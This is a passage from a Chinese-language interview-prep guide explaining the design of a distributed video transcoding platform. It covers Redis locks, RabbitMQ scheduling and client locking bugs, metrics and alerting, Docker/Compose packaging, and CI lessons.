**我的做法是：Redis 故障时降级放行**，理由是**正确性有 MySQL 条件更新兜底**：

```cpp
// 状态推进用条件更新
ShardStore::GetInstance().UpdateIfStatus(
    fresh.shard_id, {WAITING}, fresh);     // ← 只有还是 WAITING 才能推进
```

**所以「锁」是「防护」而不是「依赖」**（`doc/设计问题/业务/13.` 的原话）：

> 三层防线：① 状态复核（入口重新 Get，非 WAITING 直接 skip，防过期快照）② SETNX 分布式锁（防同一时刻竞争）③ **MySQL 条件更新兜底（Redis 故障时正确性仍成立）**。

**锁的价值是「在发 RPC 之前就拦截掉竞争方」**（省掉一次无效的 `AssignShard` RPC），而**不是「保证正确性」**——正确性由 MySQL 保证。

**释放锁也要校验 value**（`scheduler_service.cpp`）：

```cpp
auto release_lock = [&]() {
    if (!lock_acquired) return;
    std::string cur;
    bool found = false;
    if (redis.Get(lock_key, cur, found) && found && cur == lock_value)
        redis.Del(lock_key);
};
```

**为什么要 `GET` 校验**：如果不校验直接 `DEL`，可能**误删别人的锁**。场景：

```text
[t0] 进程 A 抢到锁（TTL 10 秒）
[t11] 进程 A 因为某种原因还没释放（比如 GC 卡了），锁 TTL 到期自动释放
[t12] 进程 B 抢到锁
[t13] 进程 A 恢复，执行 DEL → 删掉了 B 的锁！
```

**校验 value 之后**：A 会发现自己记的 value（`scheduler:{A的pid}`）和当前锁的 value（`scheduler:{B的pid}`）不一致，**不删**。

**「所有删除/覆盖型操作都要带身份校验」**——这是一个通用原则。

**面试官想听什么**

- 能说清「**单 key 多 field**」的理由（一次 HGETALL 拿全量 vs SCAN 多轮）
- 知道 **`ts` 内嵌在 value 里**是因为「Hash 的 field 不能单独设 TTL」
- 能说清**分布式锁的「三态区分」**（抢到 / 被占用 / Redis 故障），以及**为什么故障时要降级放行**
- 能说出「**锁是防护不是依赖**」这句话，以及正确性由谁保证（MySQL 条件更新）
- 知道**释放锁要校验 value**（防误删）

## 八、RabbitMQ：事件驱动调度

### Q8.1 为什么要引入 MQ？解决了什么问题？

**答（30 秒口述版）**

**把调度延迟从「轮询周期决定」变成「事件驱动」——实测从平均 ~1 秒降到 33 毫秒。**

**问题**：纯轮询模式下，`SchedulingLoop` 每 **2 秒**扫一次 WAITING shard。

```text
[t0]      shard 创建，状态 = WAITING
[t0+2s]   SchedulingLoop 扫描 → 发现它 → 分配
          ↑ 平均延迟 1 秒，最坏 2 秒
```

**2 秒对于「提交任务后等结果」的用户来说是可以感知的**——尤其是当整个转码只需要十几秒时，2 秒的调度延迟占了 10% 以上。

**方案**：**在任何 shard 变成 WAITING 的地方，发一条 MQ 事件**；`Scheduler` 有一个**独立的消费线程**，收到事件立刻分配。

```cpp
// scheduler_service.cpp:58-70
static void NotifyShardWaiting(const std::string& shard_id)
{
    auto& mq = MqClient::GetInstance();
    if (!mq.inited() || !mq.enabled()) return;       // 门卫：没启用就静默跳过
    if (!mq.PublishShardWaiting(shard_id))
    {
        LOG_WARN("NotifyShardWaiting: publish %s failed, fallback to "
                 "SchedulingLoop polling", shard_id.c_str());
    }
}
```

**实测数据**（【记录】）：

```text
[16:18:13.031] ScheduleJob: 2 shards created
[16:18:13.064] MqConsume: assigned shard
                  ↑ 33 毫秒
```

**对比 Pull 轮询的平均 ~1 秒，快了 30 倍。** 验收线是 <100ms，实测 33ms。

**关键设计一：Push 不是「替代」Pull，而是「增强」Pull。**

**为什么不能去掉轮询**——因为轮询承担着 Push **替代不了的职责**：

| 职责 | Push 能做吗 |
|---|---|
| 新 shard 分配 | ✅ |
| 重试/离线重置的 shard 分配 | ✅ |
| **超时重扫**（发现卡死的 shard） | ❌ 没有人会「事件通知」说「我卡住了」 |
| **启动恢复**（Scheduler 崩溃重启后扫残留） | ❌ 同理 |
| **消息丢失时的兜底** | ❌ 正好是 Push 失效的场景 |

**「超时重扫」和「启动恢复」本质上都是「扫描全表找异常」**——这类工作**只能轮询**，因为异常不会自己发通知。

**所以架构是「双模并存」**：

```cpp
// scheduler_service.cpp:1136-1143
// 依据 mq 在线状态，确定循环频率
bool mq_active = mq.inited() && mq.enabled() && mq.connected();
interval_ms = mq_active ? kScheduleIntervalMsIdle     // 5000ms（MQ 在线，降频兜底）
                        : kScheduleIntervalMs;        // 2000ms（MQ 掉线，恢复到轮询）
```

**MQ 在线时降频到 5 秒**（因为快速路径由 MQ 负责），**掉线时恢复到 2 秒**。

**这个设计的精妙之处**：**没有「切换」的中间态**。不是「检测到 MQ 故障 → 启用轮询」，而是**轮询一直在跑，只是频率不同**。这样：

- 不需要故障检测逻辑（`mq.connected()` 只是一个判断）；
- 没有「切换过程中丢事件」的窗口；
- MQ 恢复后**下次循环自动用回 5 秒频率**。

**关键设计二：超时重扫「按时间」而不是「按轮次」。**

**这是个容易踩的坑**（`doc/设计问题/业务/5.`）：

```cpp
constexpr int64_t kTimeoutRescanIntervalMs = 30000;    // 超时重扫周期（按时间，与间隔解耦）
...
if (now_ms - last_rescan_ms >= kTimeoutRescanIntervalMs)
{
    last_rescan_ms = now_ms;
    ...
}
```

**为什么不能用「每 N 轮扫一次」**——因为**循环间隔本身是变化的**（2 秒 ↔ 5 秒）：

```text
假设「每 15 轮扫一次」：
  MQ 在线（5 秒/轮）：15 × 5s = 75 秒       ← 超时重扫变成了 75 秒一次！
  MQ 掉线（2 秒/轮）：15 × 2s = 30 秒
```

**重扫周期会随着 MQ 状态漂移**——这是个隐蔽的 bug。

**改成「按时间」之后**：不管循环多久跑一轮，**重扫固定 30 秒一次**。

**注释里明确写了**：`超时重扫周期（按时间，与间隔解耦）`。

**面试官想听什么**

- 能说清「**Push 不能替代 Pull**」——因为「超时重扫」和「启动恢复」这类工作只能轮询
- 能说清「**双模并存**」比「故障切换」的好处（没有切换的中间态、没有事件丢失窗口）
- 知道**超时重扫必须「按时间」而不是「按轮次」**，以及不做会怎样（周期随 MQ 状态漂移）

**可能追问**

- Q8.1.1 两条队列的消息体为什么要不一样？

#### Q8.1.1 两条队列的消息体为什么要不一样？

**答**：**因为它们是两种不同性质的通道——一条是「通知通道」，一条是「数据通道」。**

**拓扑**（`mq_client.cpp:19-25`）：

```cpp
constexpr const char* kExchangeJobEvents    = "job.events";
constexpr const char* kExchangeShardEvents  = "shard.events";
constexpr const char* kQueueShardWaiting    = "shard.waiting";
constexpr const char* kQueueResultPending   = "result.pending";
```

| 链路 | exchange | queue | 消息体 | 性质 |
|---|---|---|---|---|
| **调度通知** | `job.events` | `shard.waiting` | **`shard_id` 纯文本** | 通知 |
| **结果上报** | `shard.events` | `result.pending` | **`ReportShardResultRequest` 序列化串** | 数据 |

**分界依据是**（`doc/设计问题/业务/14.`）：

> **「数据在不在 MySQL？」**

**`shard.waiting` 传「通知」**——因为**shard 的完整信息在 MySQL 里**。消息只需要传递「**哪个 shard 变成 WAITING 了**」这个**事实**，消费方收到后**回查数据库**拿最新数据。

```cpp
// 消息体就是 shard_id 字符串
amqp_bytes_t body = amqp_cstring_bytes(shard_id.c_str());
```

**注释里的原则**：「**通道只传身份（ID），事实永远查库**」。

**为什么这样更好**——**因为数据库里的数据是最新的**。如果消息里带完整快照：

```text
[t0] shard 变 WAITING → 发一条消息，带着「当时的快照」
[t1] 消息在队列里排队
[t2] shard 状态又被改了（比如被取消了）
[t3] 消费方收到消息，用「t0 的快照」去分配 → 用了过期数据
```

**只传 ID 就没有这个问题**——消费方在 t3 回查数据库，拿到的是**t3 时刻的真实状态**。

**`result.pending` 传「数据」**——**因为执行结果不在 MySQL 里**。

shard 的 `is_success`、`exit_code`、`output_path`、`elapsed_ms` 这些字段是 **Worker 执行完才知道的**，而且**没有先落库再发消息**（那样多一次数据库往返）。所以**结果必须随消息传递**：

```cpp
// 消息体是 protobuf 序列化数据
amqp_bytes_t body;
body.len = payload.size();
body.bytes = const_cast<char*>(payload.data());
```

**这就是真正的「事件驱动」**——事件本身携带了完整的信息。

**所以两条通道的设计原则是**：

| | 通知通道 | 数据通道 |
|---|---|---|
| 消息体 | **ID（唯一身份）** | **完整数据** |
| 消费方动作 | **回查数据库** | **直接使用** |
| 防的是什么 | 快照过期 | —— |
| 前提 | 数据已经在库里 | 数据**不在**库里 |

**这个区分很实用**——**面对「消息里该放什么」这个问题，先问「这个数据在库里吗」**。

**面试官想听什么**

- 能说清两条通道的**不同性质**（通知 vs 数据）
- 能说出分界依据：「**数据在不在 MySQL**」
- 能说清「消息里带快照」的风险（快照可能过期）
- 记住那句话：「**通道只传身份（ID），事实永远查库**」

### Q8.2 MQ 客户端踩过哪些坑？

**答（30 秒口述版）**

**踩过两个大坑，都是「锁」的问题——而且第二个坑修了三次才彻底解决。**

**坑一：单连接单锁导致 RPC 超时。**

**现象**（`doc/更新业务日志/11.`）：

```text
提交任务卡死，rpc call SchedulerService::ScheduleJob ... failed:
recv response header error! errno:11
```

**根因**：初版 MQ 客户端是**单连接 + 单锁**。而：

- **消费线程**调 `ConsumeBlocking` 时**持锁阻塞**（最长 2 秒）；
- **`ScheduleJob` 的 work 线程**切分完 shard 后要调 `PublishShardWaiting` —— **需要同一把锁**。

**结果**：发布被消费阻塞，`ScheduleJob` 等不到发布完成 → RPC 超时。

**根本原因是 `rabbitmq-c` 的连接不是线程安全的**——所以必须串行化。但**「发布」和「消费」是不相干的两件事**，让它们互相等待毫无道理。

**修复：发布和消费严格分连接、分锁**（`mq_client.h:96-115`）：

```cpp
void* publish_conn_ = nullptr;   ///< 发布连接
void* consume_conn_ = nullptr;   ///< 消费连接
std::set<std::string> consumed_queues_;

mutable std::mutex publish_mutex_;
mutable std::timed_mutex consume_mutex_;
std::atomic<bool> consume_alive_{false};
```

**注意拓扑声明（exchange/queue/binding）只在发布连接上做**——因为那是**幂等的**，声明一次就够了，消费连接只需要登录 + 开 channel。

---

**坑二：消费锁死导致整个调度停摆（修了三次）。**

**第一版现象**（阶段 11）：

> **RabbitMQ 消费锁死**：修完 ZK 后新进程仍卡死，**每轮调度循环含 metrics sampler 全部静默**。

**根因**：消费线程持 `consume_mutex_` 卡在 `amqp_consume_message` 里（线程 `wchan = do_sys_poll` 持续 8+ 分钟）。而 `SchedulingLoop` 每轮都要调 `connected()`——它要**等同一把锁**。

**关键问题在于**：`amqp_consume_message` **虽然带 timeval 参数，但内部的 poll 超时行为不可靠**——有连接半开/对端 FIN 的场景下，poll 返回可读但 `read` 阻塞，或者 poll 直接无限等待。

**修复三件事**（`mq_client.h:36-38`、`:104-113`）：

**① 消费改成自控 `poll`**：

```cpp
// mq_client.cpp:291-326（不持锁）
SetSocketTimeouts(conn, 2);
int fd = amqp_get_sockfd(conn);
struct pollfd pfd; pfd.fd = fd; pfd.events = POLLIN; pfd.revents = 0;
int pr = poll(&pfd, 1, static_cast<int>(timeout_ms));     // ← 我自己控制的 poll
if (pr == 0) return false;                                 // 正常超时（非故障）
if (pr < 0) { /* 故障：标记不可用 + 销毁连接 */ }
```

**有数据之后**再用 `amqp_consume_message({0,0})` **立即读**（不阻塞）：

```cpp
struct timeval tv0 = {0, 0};
amqp_rpc_reply_t res = amqp_consume_message(conn, &envelope, &tv0, 0);
if (res.reply_type == AMQP_RESPONSE_NORMAL) { /* 拿到消息 */ }
if (res.reply_type == AMQP_RESPONSE_LIBRARY_EXCEPTION
    && res.library_error == AMQP_STATUS_TIMEOUT)
{
    return false;    // 数据不足一帧：非故障，等待下轮再 poll
}
```

**这个「自控 poll」带来的核心价值是「确定性」**：
- 超时**可控**（我指定毫秒数）；
- 能**区分「无数据超时」和「连接故障」**（前者不销毁连接，后者销毁）；
- 能感知 `stop_flag` 和连接状态。

**② 消费锁改 `std::timed_mutex`，降级不阻塞**：

```cpp
bool MqClient::Ack(int64_t delivery_tag)
{
    if (!consume_mutex_.try_lock_for(std::chrono::milliseconds(1000)))
    {
        LOG_WARN("MqClient: consume lock busy, ack skipped "
                 "(delivery_tag=%lld, msg will redeliver)", ...);
        return false;
    }
    std::lock_guard<std::timed_mutex> lock(consume_mutex_, std::adopt_lock);
    ...
}
```

**`Ack` 的降级语义很讲究**：**不 ack ≠ 丢消息**——消息留在队列里由 Broker 重投，靠**幂等**兜底。

**`std::adopt_lock` 的用法**：先 `try_lock_for` 拿到锁，再构造 `lock_guard` **接管所有权**（避免二次加锁）。

**③ 连接建立后设 socket 超时**（2 秒兜底）：

```cpp
static void SetSocketTimeouts(amqp_connection_state_t conn, int sec)
{
    int fd = amqp_get_sockfd(conn);
    if (fd < 0) return;
    struct timeval tv; tv.tv_sec = sec; tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}
```

**两处调用**：`amqp_socket_open` 之后（防握手卡死）+ 每次 `ConsumeBlocking` 之前（兜底 read）。

---

**第二版现象**（阶段 10 复验）：

> **`consume_mutex_` 几乎 100% 被占** → `connected()` 的 `try_lock_for(1s)` **永远失败** → `consume lock busy` **每日刷 1000+ 条** + SchedulingLoop 永远显示 `(mq=pull)`。

**根因**：**`ConsumeBlocking` 在锁内做 `poll(2s)` + 消费线程紧循环**。

虽然改成了 `timed_mutex`，但 `poll` 依然在锁内——`poll` 阻塞 2 秒，然后循环立刻又拿锁再 `poll`。**锁几乎永远被占着**。

**修复：把 `poll` 移出锁**（`mq_client.h:109-113`）：

```cpp
// 阶段 12 前：poll 移出锁，消费线程紧循环持锁导致 connected() 的 try_lock_for(1s)
// 永远失败（mq=push 误判 + consume lock busy WARN 无限刷屏）。锁只保护 conn 内部
// 状态的读写（read/销毁/重建），poll 期间无并发写者（消费连接只由消费线程销毁）。
```

**为什么「poll 期间没有并发写者」**——因为**消费连接只由消费线程销毁**。发布连接是另一条（坑一已经分开了），而消费者自己不会同时在两个地方动这条连接。

**三段式结构**（`ConsumeBlocking`）：

```text
① 短锁：声明 consume（幂等，只做一次）
② 锁外：poll（可能阻塞 2 秒，但**不持锁**）    ← 关键
③ 短锁：read（数据已在 socket，毫秒级）
```

**第三版：`connected()` 改成完全无锁。**

即使 poll 移出锁了，`connected()` 还是可能撞上「③ 短锁」的窗口。所以最终方案是**用原子变量**（`mq_client.h:115`）：

```cpp
std::atomic<bool> consume_alive_{false};  ///< 消费连接有效性（atomic，connected() 无锁读取）

// 读取
bool MqClient::connected() const
{
    return consume_alive_.load() && consume_conn_ != nullptr;
}
```

**写入点**：
- `ConnectConsume` 进入时 `store(false)`（重建期间标记不可用）；
- 建连成功后 `store(true)`；
- `ConsumeBlocking` 的故障分支 `store(false)` 后销毁连接。

**`connected()` 从此变成「一条 atomic load + 一次指针比较」——彻底不抢锁了。**

**这才是「mq=push 误判 + WARN 刷屏」的最终解。**

**面试官想听什么**

- 能说清**坑一的根因**（单连接单锁 → 发布被消费阻塞）以及修复（双连接双锁）
- 能说清**坑二的演进过程**：从「阻塞 API」→「timed_mutex」→「poll 移出锁」→「atomic 无锁读」
- 知道**每一步的不彻底之处**（为什么 timed_mutex 还不够）
- 能说清「**poll 期间无并发写者**」这个前提（消费连接只由消费线程销毁）

## 九、可观测性

### Q9.1 你是怎么设计可观测性的？

**答（30 秒口述版）**

**双轨制：Prometheus 指标（集群级）+ 进程内日志告警（兜底，不依赖外部组件）。**

**为什么是双轨**——`doc/更新业务日志/12.` 的验收要求：

> 「告警至少日志打印」——**若只依赖 Prometheus，没部署监控时告警就完全失效**。

**轨道一：Prometheus 指标。**

自研的指标库（在 `mprpc` 框架层）提供 Counter / Gauge / Histogram，每个服务起一个 HTTP 端口（9091-9097）暴露 `/metrics`。

**关键决策：指标库放在 `mprpc` 而不是 `video_platform`**，理由：

> `rpc_latency_ms` 必须插桩在 **RPC 客户端热路径**；`video_platform` 各服务经 `video_common → mprpc` 传递依赖自动可用，**零重复代码**。

**埋了哪些指标**：

| 类别 | 指标 |
|---|---|
| RPC | `rpc_latency_ms{method}` 直方图 |
| 任务 | `job_submitted_total` / `job_success_total` / `job_failed_total` |
| shard | `shard_retry_total` / `shard_count{status}` / `shard_running` / `shard_waiting` / `scheduler_queue_size` |
| Worker | `worker_online` / `worker_cpu_usage{worker_id}` / `worker_memory_usage{worker_id}` / `worker_running_shards{worker_id}` |
| 调度 | `schedule_loop_duration_ms` |
| 执行 | `transcode_duration_ms` |

**轨道二：进程内日志告警（30 秒一轮）。**

```cpp
// 4 条规则
{"worker_offline",        "ERROR", ..., 1,    false, ...}  // worker_online < 1
{"scheduler_backlog",     "WARN",  ..., 100,  true,  ...}  // queue > 100
{"job_failed_rate_high",  "WARN",  ..., 0.3,  true,  ...}  // 失败率 > 30%
{"rpc_latency_p99_high",  "WARN",  ..., 1000, true,  ...}  // P99 > 1000ms
```

**触发和恢复都会打日志**：

```cpp
if (!st.alerted && (now - st.since) >= r.for_ms)
{
    st.alerted = true;
    if (r.severity == "ERROR")
        LOG_ERROR("ALERT [%s] firing: value=%.2f, threshold=%.2f, %s", ...);
    else
        LOG_WARN("ALERT [%s] firing: value=%.2f, threshold=%.2f, %s", ...);
}
else if (st.active)
{
    if (st.alerted) LOG_INFO("ALERT [%s] recovered: value=%.2f, threshold=%.2f, %s", ...);
    st.active = false; st.alerted = false;
}
```

**`for_ms` 是防抖**——「条件持续成立多久才真正触发」。`alerted` 标志保证**触发/恢复各只打一次**，不会刷屏。

**实测验证**【记录】：故障注入时日志里出现了 `ALERT [worker_offline] firing` 和 `recovered`，间隔 2.4 分钟。

**交付的配置产物**：`prometheus.yml`（7 个 target）+ `alerts.yml`（4 条 PromQL 规则，阈值和内置告警一致）+ `grafana-dashboard.json`（4 行面板：Job 吞吐 / Shard 分布 / Worker 热力图 / RPC 延迟）。

**面试官想听什么**

- 能说出「**双轨制**」以及理由（没部署监控时告警不能失效）
- 知道**指标库放在框架层**的理由（热路径插桩 + 传递依赖零重复）
- 知道 `for_ms` 是防抖、`alerted` 防刷屏

**可能追问**

- Q9.1.1 指标口径上有什么坑？

#### Q9.1.1 指标口径上有什么坑？

**答**：**踩过三个，都是「看起来对但其实错」的。**

**坑一：`scheduler_queue_size` 的口径设计。**

**问题**：什么叫「调度积压」？只算 `WAITING` 吗？

**我的定义**（`doc/更新业务日志/12.`）：

> `scheduler_queue_size = WAITING + ASSIGNED`（**已分配未开始也是调度积压**，与 `shard_waiting` 严格区分）

**理由**：如果只算 WAITING，那么「所有 shard 都分配出去了但一个都没开始执行」的情况下，`queue_size = 0`——**看起来调度很健康，实际上任务全卡住了**。

**把 ASSIGNED 算进来之后**，这个指标才真正反映「有多少工作还没开始跑」。

**坑二：状态归零后 Prometheus 保留旧值。**

**问题**：假设某个状态下 shard 数归零了，如果**不再上报这个状态**，Prometheus 会**保留最后一次上报的值**——于是 Grafana 的饼图上会出现**永不消失的残留扇区**。

**修复**：**全枚举显式 Set 0**（`scheduler_service.cpp` 的采样器）：

```cpp
// 对未出现的状态显式 Set(0)，防止 Prometheus/Grafana 残留旧值
```

**这个坑的本质是**：Prometheus 是**拉模型 + 时间序列**，它**不知道「这个 series 消失了」**——只有你显式上报 0，它才知道「现在是 0」。

**坑三：失败率的两套口径差异。**

`doc/更新业务日志/12.` 的原话：

> 失败率两套口径（Prometheus 用失败/提交、进程内兜底用失败/终态——**单进程拿不到对方 counter**）是**刻意设计不是 bug**。

**为什么会有两套**：

| 口径 | 计算方式 | 用在哪 | 为什么 |
|---|---|---|---|
| **失败/提交** | `job_failed_total / job_submitted_total` | Prometheus 告警 | 跨实例聚合，**能从全局看** |
| **失败/终态** | `failed / (failed + success)` | 进程内告警 | **单进程只有一个 counter**，拿不到「提交数」 |

**为什么进程内拿不到「提交数」**：因为 `job_submitted_total` 是 **JobService** 的 counter，而失败判定在 **ResultCollector**——**它们是两个进程**！

所以 RC 的进程内告警只能用「**自己有的两个 counter**」（`job_success_total` + `job_failed_total`）算比率：

```cpp
// result_collector.cpp:591-617
// 内置口径：失败数 / 终态数（本进程同时维护 success/failed 两个
// counter，无需跨进程读 job_submitted_total）；
// Prometheus 侧口径为 failed/submitted（跨实例聚合，见 alerts.yml）
mprpc::RateEstimator failed_estimator(5 * 60 * 1000);
mprpc::RateEstimator terminal_estimator(5 * 60 * 1000);
metrics_reg.RegisterAlertRule(
    {"job_failed_rate_high", "WARN",
     [&]() {
         double rf = failed_estimator.Observe(
             metrics_reg.Counter("job_failed_total", "...").Value());
         double rt = terminal_estimator.Observe(
             metrics_reg.Counter("job_failed_total", "...").Value()
           + metrics_reg.Counter("job_success_total", "...").Value());
         return rt > 0 ? rf / std::max(rt, 0.001) : 0.0;
     },
     0.3, true, 0, "5 分钟窗口任务失败率超过 30%"});
```

**注意 `RateEstimator` 返回的是「速率（值/秒）」**——两个速率相除，正好是**比率**（分子分母的时间单位约掉了）。

**三个坑的共同点**：**指标不是「打上去就行」，口径本身需要设计**。一个口径错的指标比没有指标更危险——因为它会给出**看似可信的错误结论**。

**面试官想听什么**

- 能说清 `scheduler_queue_size = WAITING + ASSIGNED` 的**设计理由**（「已分配未开始」也是积压）
- 知道 Prometheus 的「**状态归零要显式 Set(0)**」坑（拉模型不知道 series 消失）
- 能说清**两套失败率口径**为什么是刻意的（**单进程拿不到对方的 counter**）

## 十、容器化与 CI

### Q10.1 容器化是怎么做的？

**答（30 秒口述版）**

**单镜像多阶段构建 + Docker Compose 编排 9 个容器（4 中间件 + 5 服务）。**

**Dockerfile 的两个关键点**：

**① 多阶段构建**：

```dockerfile
# builder 阶段：编译全部二进制
FROM ubuntu:24.04 AS builder
# ... 装依赖、cmake、编译 ...

# runtime 阶段：精简镜像
FROM ubuntu:24.04
# 只拷贝编译产物 + 运行时库
```

**② `-DENABLE_NATIVE_MARCH=OFF`**：

```cpp
// 根 CMakeLists.txt 新增选项
option(ENABLE_NATIVE_MARCH "..." ON)
```

**为什么要关掉**：`-march=native` 会针对**编译机器的 CPU** 生成指令（比如 AVX-512）。但 Docker 镜像可能**在 A 机器构建、B 机器运行**——如果 B 的 CPU 不支持那些指令，**直接 `SIGILL` 崩溃**。

**关掉之后**：生成通用的 x86-64 指令，**牺牲少量性能换取可移植性**。这是容器化部署的**必要取舍**。

**③ 为什么是「单镜像多阶段」而不是「5 个独立 Dockerfile」**（`doc/设计问题/业务/16.`）：

> 一个 CMake 工程编译一次产出全部二进制…**写 5 个独立 Dockerfile 内容 90% 重复且要编译 5 遍**。

**我的 5 个服务共享同一个镜像，用 compose 的 `command` 区分**：

```yaml
job_service:
  build: .
  command: ["./bin/job_service", "-i", "/app/conf/job_service.conf"]
scheduler_service:
  image: <同一个镜像>
  command: ["./bin/scheduler_service", "-i", "/app/conf/scheduler.conf"]
```

**Compose 编排的关键点**：

**① 中间件用 healthcheck + `depends_on: condition: service_healthy`**：

```yaml
zookeeper:
  image: zookeeper:3.8
  healthcheck:
    test: ["CMD", "bash", "-c", "echo ruok | nc localhost 2181"]   # ← 注意 bash -c
    interval: 5s
    retries: 10
```

**为什么必须 `bash -c`**：`CMD-SHELL` 默认走 **dash**，而 dash **不支持 `/dev/tcp`**。必须显式指定 `bash`。

**② ZK 必须开 4lw 白名单**：

```yaml
environment:
  ZOO_4LW_COMMANDS_WHITELIST: ruok
```

**ZooKeeper 3.8 默认禁用 `4lw`（four-letter words）命令**——不开白名单的话，`ruok` 探测会**超时 60 秒**，然后容器被判 unhealthy。**这是 CI 里踩到的坑**。

**③ `transcode_worker` 不映射端口**：

**为什么**：因为它**支持 `--scale` 横向扩容**——如果映射了端口，第二个副本会因为**端口冲突**起不来。**容器之间通过 ZK 服务发现互通，不需要宿主端口。**

**④ 宿主端口用替代端口**（21810 / 23306 / 19001 等）：

**因为本机已经有一套手工部署占用了标准端口**（2181 / 3306 / 9001）。容器内部还是标准端口，只在宿主映射时用替代端口。

**⑤ `worker_id` 唯一性**（`ResolveWorkerId`）：

```cpp
static std::string ResolveWorkerId()
{
    const char* env = getenv("WORKER_ID");
    if (env && *env) return env;

    std::string id = MprpcApplication::GetConfig().Load("worker_id");
    if (!id.empty()) return id;

    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname) - 1) == 0 && hostname[0])
        return hostname;
    return "unknown_worker";
}
```

**优先级：环境变量 > 配置 > hostname**。

**`--scale transcode_worker=3` 时，三个副本用同一份配置文件**——那 `worker_id` 怎么区分？

**靠 `hostname`**：Docker 给每个容器分配唯一的 hostname（就是容器 ID）。**所以不需要任何分布式 ID 方案，容器自己就提供了唯一性。**

**这个设计很省事**——避免了引入「Redis 生成 ID」或者「雪花算法」之类的复杂度。

**面试官想听什么**

- 能说清 **`ENABLE_NATIVE_MARCH=OFF` 的必要性**（镜像跨机器运行会 SIGILL）
- 能说清**单镜像多阶段**的理由（一个 CMake 工程，避免重复编译 5 遍）
- 知道 **ZK 3.8 的 `4lw` 白名单**和 **`bash -c`** 这两个实战坑
- 能说清 **`transcode_worker` 不映射端口**是为了支持 `--scale`
- 能说清 **`worker_id` 靠 hostname 天然唯一**

### Q10.2 CI 是怎么设计的？

**答（30 秒口述版）**

**四个 job 串行：build → unit-test → integration → benchmark。其中 integration 是唯一「真实验证」的环节。**

```yaml
build:         apt 装依赖 + cmake + 上传 bin/ artifact
unit-test:     下载 artifact + 跑 43 个单测
integration:   docker compose up -d --build + scripts/integration_test.sh
benchmark:     rpc_echo_server + bench_rpc_stress --direct --keepalive
```

**`integration` 是这个 CI 里最有价值的部分**——因为它跑的是**真实的端到端链路**：

```bash
# scripts/integration_test.sh 大意
1. 用 ffmpeg testsrc 生成一个 30 秒的测试视频
2. 用管道向 job_client 提交任务
3. job_client --watch 轮询直到 SUCCESS
4. 用 ffprobe 校验合并产物的时长
```

**为什么这是「唯一真实验证点」**：

- `unit-test` 只验证了 Buffer / ThreadPool / RPC 协议这些**纯逻辑**；
- `benchmark` 验证的是**性能**；
- **只有 `integration` 验证了「整个平台能不能跑通一个真实任务」**——它覆盖了 Docker 构建、容器编排、服务注册发现、MySQL 持久化、FFmpeg 执行、结果合并这一整条链路。

**而且它是唯一能发现「环境相关缺陷」的地方**。CI 实测暴露了 4 个**本机编译完全发现不了**的真实缺陷：

| # | 缺陷 | 根因 |
|---|---|---|
| 1 | **Ubuntu 22.04 的 protobuf 3.12 编译不了仓库提交的 3.21 生成码** | `Message::New()` 纯虚接口差异 |
| 2 | **ZK 3.9.1 同步 API 被 `THREADED` 宏包裹** | noble 的头文件里 `zoo_create` 等只在 `#ifdef THREADED` 下可见，**本机旧头文件掩盖了这个问题** |
| 3 | **Provider 注册 `0.0.0.0` 死地址** | 消费者连 `0.0.0.0:9002` 报 **errno 111** |
| 4 | **worker main 漏改 `LoadRequired("worker_id")`** | 改造 `ResolveWorkerId()` 时漏改启动校验 → **启动即崩溃循环** |

**第 2 条特别值得说**——**「本机旧头文件掩盖」这个现象很有代表性**：

```cpp
// 本机（旧版 zookeeper.h）：zoo_create 无条件可见 → 编译通过
// noble（3.9.1）：#ifdef THREADED 才可见 → 编译失败
```

**这说明了容器化/CI 的一个核心价值**：**「我的机器上能编译」不等于「能编译」**。环境差异（库版本、头文件、编译器版本）**只有在干净环境里才会暴露**。

**第 3 条（0.0.0.0）也是**——本机部署时 `rpcserverip=127.0.0.1` 完全没问题，**只有容器里绑定 `0.0.0.0` 才暴露**。

**`benchmark` job 的一个坑**：`rpc_echo_server` 是 Provider，**需要连 ZooKeeper 注册**——所以 benchmark 也得起 ZK，而且 **ZK 必须开 `ZOO_4LW_COMMANDS_WHITELIST: ruok`**，否则 ruok 探测超时 60 秒。

**面试官想听什么**

- 能说清**四个 job 的分工**，以及为什么 `integration` 是「唯一真实验证点」
- **能举出 CI 实测暴露的具体缺陷**（尤其是「本机旧头文件掩盖」这个现象）
- 能说出 CI 的核心价值：「**我这台机器上能编译 ≠ 能编译**」

**可能追问**

- Q10.2.1 CI 里遇到过什么 flaky 问题？

#### Q10.2.1 CI 里遇到过什么 flaky 问题？

**答**：**遇到过一个，而且最后的处理是「兜底而非根治」——我如实说明。**

**现象**：`integration` job 里，`job_client --watch` 轮询任务状态，**偶尔**会卡在「shard_0 SUCCESS、shard_1 一直 RUNNING」然后**超时 240 秒失败**。

**排查过程**：

1. **首先排除了「功能 bug」**——因为**本地跑同样的流程 5/5 成功**；
2. **观察到是「偶发」**——大概十几次 CI 里撞一次；
3. **定位到是 RC 的 MQ 消费**——`result.pending` 消息偶发延迟处理（有记录说是**偶发 ~5 分钟**的延迟）。

**根因（部分定位）**：RabbitMQ 消费链路的 poll/ack 状态机在某些时序下会**长时间不消费**。

**处理方式**：**把 `--watch` 的超时从 240 秒改到 420 秒**。

**这是「兜底」而不是「根治」**——我在文档里明确标注了：

> 根因 5 是**兜底而非根治**：RC MQ 消费静默延迟（`result.pending` 偶发 ~5 分钟）仍在，只是 **CI 不再撞超时**。根治方案待后续（**独立排查 RC 消费线程 poll/ack 状态机**）。

**为什么我选择兜底**：

1. **本地无法稳定复现**——偶发问题没有复现路径，盲改代码风险很高（可能改出更严重的问题）；
2. **CI 的价值是「守住功能不回归」**——把超时放宽**让 CI 恢复绿灯**，能继续保护其他改动；
3. **根治需要专门的排查时间**——要对 `MqClient` 的消费状态机做系统性的检查，不是顺手能修的。

**但这个决定的代价我也清楚**：**问题被「藏」起来了**。CI 绿灯不代表「没问题」，只代表「在 7 分钟内没问题」。**如果这个延迟在生产环境变成 10 分钟，CI 是发现不了的。**

**所以我在文档里明确标记了它是「兜底」**——这样后续的人知道这里有个待办，而不是以为问题已经解决了。**「诚实地记录兜底」比「假装修好了」重要。**

**面试官想听什么**

- 能说清「**兜底 vs 根治**」的区别，以及选择兜底的**理由**（无法复现、CI 需要保持绿灯）
- **主动说明代价**（问题被藏起来了，CI 绿灯不代表没问题）
- 知道「**在文档里明确标记兜底**」这个做法——这体现工程诚实

### 剧本①：已完成任务的 shard 被重复调度

